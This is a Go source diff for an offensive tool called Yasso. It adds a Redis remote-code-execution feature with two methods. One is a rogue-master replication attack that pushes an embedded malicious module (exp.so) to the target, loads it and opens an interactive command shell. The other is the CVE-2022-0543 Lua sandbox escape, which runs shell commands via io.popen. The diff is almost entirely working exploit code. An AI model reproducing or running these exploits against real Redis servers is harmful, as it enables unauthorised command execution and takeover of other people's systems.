@@ -4,14 +4,23 @@ package cmd
 import (
 	"Yasso/config"
 	"bufio"
+	"context"
 	"errors"
 	"fmt"
 	"github.com/spf13/cobra"
+	"github.com/go-redis/redis/v8"
+	"io"
 	"net"
 	"os"
+	"path/filepath"
 	"strings"
+	"sync"
 	"time"
+	_ "embed"
+
 )
+//go:embed static/exp.so
+var payload []byte
 
 var RedisCmd = &cobra.Command{
 	Use:   "redis",
@@ -27,6 +36,11 @@ var RedisCmd = &cobra.Command{
 var (
 	RemoteHost      string
 	RemotePublicKey string
+	LocalHost string
+	LocalPort int
+	RemoteSoPath string
+	IsRCE bool
+	RedisRCEMethod string
 )
 
 func init() {
@@ -35,6 +49,12 @@ func init() {
 	RedisCmd.Flags().StringVar(&ConnHost, "hostname", "", "Redis will connect this address")
 	RedisCmd.Flags().StringVar(&LoginPass, "pass", "", "set login pass")
 	RedisCmd.Flags().StringVar(&SQLCommand, "sql", "", "Execute redis sql command")
+	RedisCmd.Flags().StringVar(&LocalHost,"lhost","","set local listen host (target redis need connect)")
+	RedisCmd.Flags().IntVar(&LocalPort,"lport",20001,"set local listen port (target redis need connect)")
+	RedisCmd.Flags().StringVar(&RemoteSoPath,"so","","set target so path (not must)")
+	RedisCmd.Flags().StringVar(&RedisRCEMethod,"method","rce","rce(master-slave) or lua(CVE-2022-0543)")
+	RedisCmd.Flags().BoolVar(&IsRCE,"rce",false,"Whether to try rCE vulnerability")
+
 }
 
 func BruteRedisByUser() {
@@ -83,8 +103,22 @@ func BruteRedisByUser() {
 		if status == true {
 			RedisExploit(conn, RemoteHost, RemotePublicKey)
 		}
+	}
+	if Hosts == "" && ConnHost != "" && RedisRCEMethod != "" && IsRCE == true && LocalHost != ""{
+		client := InitRedisClient(ConnHost,BrutePort,LoginPass)
+		if strings.ToLower(RedisRCEMethod) == "rce" && LocalHost != "" && LocalPort != 0{
+			// 主从复制
+			RedisRCE(client,LocalHost,LocalPort,RemoteSoPath)
+		}else if strings.ToLower(RedisRCEMethod) == "lua"{
+			//lua 沙盒逃逸
+			RedisLua(client)
+		}else{
+			Println("[*] you need choose a rce method")
+			return
+		}
+		_ = client.Close()
 	} else {
-		Println("[*] May be your want use redis extend ? Try to add --rekey or --rebound")
+		Println("[*] May be your want use redis extend ? Try to add --rekey or --rebound or --rce rce")
 	}
 }
 
@@ -448,3 +482,215 @@ func ReadKeyFile(filename string) (string, error) {
 	}
 	return "", err
 }
+
+func RedisRCE(client *redis.Client,LHost string,LPort int,SoPath string){
+	// 设置so文件存放路径
+	var dest string
+	if SoPath == "" {
+		dest = "/tmp/net.so"
+	}else{
+		dest = SoPath
+	}
+	Rexec(fmt.Sprintf("slaveof %v %v",LHost,LPort),client)
+	fmt.Println(fmt.Sprintf("[+] slaveof %v %v",LHost,LPort))
+	dbfilename,dir := getInformation(client)
+	filenameDir,filename:= filepath.Split(dest)
+	Rexec(fmt.Sprintf("config set dir %v",filenameDir),client)
+	Rexec(fmt.Sprintf("config set dbfilename %v",filename),client)
+	// 做监听
+	ListenLocal(fmt.Sprintf("%v:%v",LHost,LPort))
+	// 重置数据库
+	reStore(client,dir,dbfilename)
+	// 加载so文件
+	s := Rexec(fmt.Sprintf("module load %v",dest),client)
+	if s == "need unload" {
+		fmt.Println("[+] try to unload")
+		Rexec(fmt.Sprintf("module unload system"),client)
+		fmt.Println("[+] to the load")
+		Rexec(fmt.Sprintf("module load %v",dest),client)
+	}
+	fmt.Println("[+] module load success")
+	// 循环执行命令
+	reader:= bufio.NewReader(os.Stdin)
+	for {
+		var cmd string
+		fmt.Printf("[redis-rce]» ")
+		cmd,_= reader.ReadString('\n')
+		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd,"\r",""),"\n","")
+		if cmd == "exit" {
+			cmd = fmt.Sprintf("rm %v",dest)
+			run(fmt.Sprintf(cmd),client)
+			Rexec(fmt.Sprintf("module unload system"),client)
+			fmt.Println("[+] module unload system break redis-rce")
+			break
+		}
+		Receive(run(fmt.Sprintf(cmd),client))
+	}
+	os.Exit(0)
+}
+
+
+func RedisLua(client *redis.Client){
+	reader:=bufio.NewReader(os.Stdin)
+	for {
+		var cmd string
+		fmt.Printf("[redis-lua]» ")
+		cmd,_= reader.ReadString('\n')
+		cmd = strings.ReplaceAll(strings.ReplaceAll(cmd,"\r",""),"\n","")
+		if cmd == "exit"{
+			break
+		}
+		Receive(execLua(cmd,client))
+	}
+	os.Exit(0)
+}
+
+
+
+func Rexec(cmd string,client *redis.Client) string {
+	args := strings.Fields(cmd)
+	var argsInterface []interface{}
+	for _,arg := range args {
+		argsInterface = append(argsInterface,arg)
+	}
+	//Send(cmd)
+	val, err := client.Do(context.Background(),argsInterface...).Result()
+	return Check(val,err)
+}
+
+func getInformation(client *redis.Client)(string,string){
+	r := Rexec("config get dbfilename",client)
+	if !strings.HasPrefix(r,"dbfilename") {
+		return "",""
+	}
+	dbfilename := r[11:len(r)-1]
+	d := Rexec("config get dir",client)
+	if !strings.HasPrefix(d,"dir") {
+		return "",""
+	}
+	dir := d[4:len(d)-1]
+	return dbfilename,dir
+}
+
+
+func Send(str string) {
+	str = strings.TrimSpace(str)
+	fmt.Println(fmt.Sprintf("[->] %v",str))
+}
+
+func Receive(str string){
+	str = strings.TrimSpace(str)
+	fmt.Println(fmt.Sprintf("%v",str))
+}
+
+func Check(val interface{},err error) string {
+	if err != nil {
+		if err == redis.Nil {
+			fmt.Println("[!] key is not exist")
+			return ""
+		}
+		fmt.Println(fmt.Sprintf("[!] %v",err.Error()))
+		if err.Error( )== "ERR Error loading the extension. Please check the server logs."{
+			return "need unload"
+		}
+		os.Exit(0)
+	}
+	switch v:=val.(type){
+	case string:
+		return v
+	case []string:
+		return "list result:"+strings.Join(v," ")
+	case []interface{}:
+		s:=""
+		for _,i:=range v{
+			s+=i.(string)+" "
+		}
+		return s
+	}
+	return ""
+}
+
+func ListenLocal(address string){
+	var wg = &sync.WaitGroup{}
+	wg.Add(1)
+	addr ,err := net.ResolveTCPAddr("tcp",address)
+	if err != nil {
+		fmt.Println("[!] resolve tcp address failed")
+		os.Exit(0)
+	}
+	listen,err := net.ListenTCP("tcp",addr)
+	if err != nil {
+		fmt.Println("[!] listen tcp address failed")
+		os.Exit(0)
+	}
+	defer listen.Close()
+	fmt.Println(fmt.Sprintf("[*] start listen in %v",address))
+	c, err := listen.AcceptTCP()
+	if err != nil {
+		fmt.Println("[!] accept tcp failed")
+		os.Exit(0)
+	}
+	go masterSlave(wg,c)
+	wg.Wait()
+	_ = c.Close()
+}
+
+func masterSlave(wg *sync.WaitGroup,c *net.TCPConn){
+	defer wg.Done()
+	buf := make([]byte,1024)
+	for {
+		time.Sleep(1 * time.Second)
+		n,err := c.Read(buf)
+		if err == io.EOF || n == 0 {
+			fmt.Println("[*] master-slave replication process is complete")
+			return
+		}
+		switch  {
+		case strings.Contains(string(buf[:n]),"PING"):
+			c.Write([]byte("+PONG\r\n"))
+			//Send("+PONG")
+		case strings.Contains(string(buf[:n]),"REPLCONF"):
+			c.Write([]byte("+OK\r\n"))
+			//Send("+OK")
+		case strings.Contains(string(buf[:n]),"SYNC"):
+			resp:="+FULLRESYNC "+"ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ"+" 1"+"\r\n" // 垃圾字符
+			resp+="$"+ fmt.Sprintf("%v",len(payload)) + "\r\n"
+			rep :=[]byte(resp)
+			rep = append(rep,payload...)
+			rep = append(rep,[]byte("\r\n")...)
+			c.Write(rep)
+			//Send(resp)
+		}
+	}
+}
+
+func reStore(client *redis.Client,dir,dbfilename string){
+	success := Rexec("slaveof no one",client)
+	if strings.Contains(success,"OK"){
+		fmt.Println("[+] restore file success")
+	}
+	Rexec(fmt.Sprintf("config set dir %v",dir),client)
+	Rexec(fmt.Sprintf("config set dbfilename %v",dbfilename),client)
+}
+
+func run(cmd string,client *redis.Client)string{
+	ctx:= context.Background()
+	val, err := client.Do(ctx,"system.exec",cmd).Result()
+	return Check(val,err)
+}
+
+func execLua(cmd string,client *redis.Client) string {
+	ctx:=context.Background()
+	val, err := client.Do(ctx,"eval",fmt.Sprintf(`local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); local io = io_l(); local f = io.popen("%v", "r"); local res = f:read("*a"); f:close(); return res`,cmd),"0").Result()
+	return Check(val, err)
+}
+
+func InitRedisClient(host string ,port int,pass string)*redis.Client{
+	rdb := redis.NewClient(&redis.Options{
+		Addr:     fmt.Sprintf("%v:%v",host,port),
+		Password: pass, // no password set
+		DB:       0,  // use default DB
+	})
+	return rdb
+}
+
